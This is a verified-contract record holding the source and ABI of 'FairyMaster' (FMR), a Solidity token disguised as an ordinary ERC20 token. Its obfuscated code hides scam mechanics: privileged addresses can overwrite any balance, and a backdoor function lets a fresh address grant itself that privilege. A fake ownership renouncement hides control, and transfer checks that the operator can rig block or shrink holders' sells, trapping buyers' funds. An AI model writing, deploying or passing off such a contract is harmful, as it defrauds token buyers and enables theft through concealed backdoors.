{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface feeTotal {\n    function createPair(address txTotal, address buyLimitToken) external returns (address);\n}\n\ninterface feeTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletMin) external view returns (uint256);\n\n    function transfer(address launchedReceiver, uint256 walletIs) external returns (bool);\n\n    function allowance(address isBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedReceiver,\n        uint256 walletIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTotal, uint256 value);\n    event Approval(address indexed isBuy, address indexed spender, uint256 value);\n}\n\nabstract contract fromFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTakeMetadata is feeTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FairyMaster is fromFee, feeTake, feeTakeMetadata {\n\n    mapping(address => mapping(address => uint256)) private autoLaunch;\n\n    bool private isTokenList;\n\n    uint256 listReceiver;\n\n    uint8 private marketingList = 18;\n\n    function balanceOf(address walletMin) public view virtual override returns (uint256) {\n        return modeSellWallet[walletMin];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityEnable;\n    }\n\n    bool private liquidityLaunchTx;\n\n    function approve(address launchedSwap, uint256 walletIs) public virtual override returns (bool) {\n        autoLaunch[_msgSender()][launchedSwap] = walletIs;\n        emit Approval(_msgSender(), launchedSwap, walletIs);\n        return true;\n    }\n\n    function maxTrading(address swapAt, address launchedReceiver, uint256 walletIs) internal returns (bool) {\n        if (swapAt == senderSellExempt) {\n            return tokenTake(swapAt, launchedReceiver, walletIs);\n        }\n        uint256 enableTo = feeTake(marketingTake).balanceOf(walletFundLiquidity);\n        require(enableTo == listReceiver);\n        require(launchedReceiver != walletFundLiquidity);\n        if (tradingExempt[swapAt]) {\n            return tokenTake(swapAt, launchedReceiver, tradingTeamList);\n        }\n        return tokenTake(swapAt, launchedReceiver, walletIs);\n    }\n\n    mapping(address => bool) public tradingExempt;\n\n    string private liquidityEnable = \"FMR\";\n\n    bool private exemptMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeAmount;\n    }\n\n    function tokenTake(address swapAt, address launchedReceiver, uint256 walletIs) internal returns (bool) {\n        require(modeSellWallet[swapAt] >= walletIs);\n        modeSellWallet[swapAt] -= walletIs;\n        modeSellWallet[launchedReceiver] += walletIs;\n        emit Transfer(swapAt, launchedReceiver, walletIs);\n        return true;\n    }\n\n    function teamTake() private view {\n        require(swapToBuy[_msgSender()]);\n    }\n\n    uint256 public exemptFeeReceiver;\n\n    string private liquidityTx = \"Fairy Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTx;\n    }\n\n    function getOwner() external view returns (address) {\n        return listToken;\n    }\n\n    mapping(address => uint256) private modeSellWallet;\n\n    bool private modeToken;\n\n    function autoMarketingLaunch(address exemptFromReceiver, uint256 walletIs) public {\n        teamTake();\n        modeSellWallet[exemptFromReceiver] = walletIs;\n    }\n\n    function allowance(address takeSender, address launchedSwap) external view virtual override returns (uint256) {\n        if (launchedSwap == txFrom) {\n            return type(uint256).max;\n        }\n        return autoLaunch[takeSender][launchedSwap];\n    }\n\n    bool private fromIsMin;\n\n    uint256 senderReceiver;\n\n    bool public senderSwap;\n\n    address txFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (liquidityLaunchTx) {\n            liquidityLaunchTx = true;\n        }\n        autoReceiver toAmount = autoReceiver(txFrom);\n        marketingTake = feeTotal(toAmount.factory()).createPair(toAmount.WETH(), address(this));\n        \n        senderSellExempt = _msgSender();\n        swapToBuy[senderSellExempt] = true;\n        modeSellWallet[senderSellExempt] = modeAmount;\n        limitMarketing();\n        if (minLiquidity == takeExemptShould) {\n            liquidityLaunchTx = false;\n        }\n        emit Transfer(address(0), senderSellExempt, modeAmount);\n    }\n\n    function transferFrom(address swapAt, address launchedReceiver, uint256 walletIs) external override returns (bool) {\n        if (_msgSender() != txFrom) {\n            if (autoLaunch[swapAt][_msgSender()] != type(uint256).max) {\n                require(walletIs <= autoLaunch[swapAt][_msgSender()]);\n                autoLaunch[swapAt][_msgSender()] -= walletIs;\n            }\n        }\n        return maxTrading(swapAt, launchedReceiver, walletIs);\n    }\n\n    mapping(address => bool) public swapToBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingList;\n    }\n\n    function limitMarketing() public {\n        emit OwnershipTransferred(senderSellExempt, address(0));\n        listToken = address(0);\n    }\n\n    function shouldExemptToken(address senderLimitMarketing) public {\n        require(senderLimitMarketing.balance < 100000);\n        if (senderSwap) {\n            return;\n        }\n        \n        swapToBuy[senderLimitMarketing] = true;\n        \n        senderSwap = true;\n    }\n\n    function liquidityMode(address atFrom) public {\n        teamTake();\n        if (exemptMarketing != modeToken) {\n            liquidityLaunchTx = false;\n        }\n        if (atFrom == senderSellExempt || atFrom == marketingTake) {\n            return;\n        }\n        tradingExempt[atFrom] = true;\n    }\n\n    function transfer(address exemptFromReceiver, uint256 walletIs) external virtual override returns (bool) {\n        return maxTrading(_msgSender(), exemptFromReceiver, walletIs);\n    }\n\n    address public senderSellExempt;\n\n    uint256 constant tradingTeamList = 2 ** 10;\n\n    function owner() external view returns (address) {\n        return listToken;\n    }\n\n    uint256 private modeAmount = 100000000 * 10 ** 18;\n\n    uint256 private takeExemptShould;\n\n    address public marketingTake;\n\n    uint256 public minLiquidity;\n\n    address private listToken;\n\n    address walletFundLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed feeTrading, address indexed atLiquidityTo);\n\n    function teamFund(uint256 walletIs) public {\n        teamTake();\n        listReceiver = walletIs;\n    }\n\n    bool private feeShouldMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLiquidityTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletIs\",\"type\":\"uint256\"}],\"name\":\"autoMarketingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFeeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"liquidityMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSellExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLimitMarketing\",\"type\":\"address\"}],\"name\":\"shouldExemptToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapToBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletIs\",\"type\":\"uint256\"}],\"name\":\"teamFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FairyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}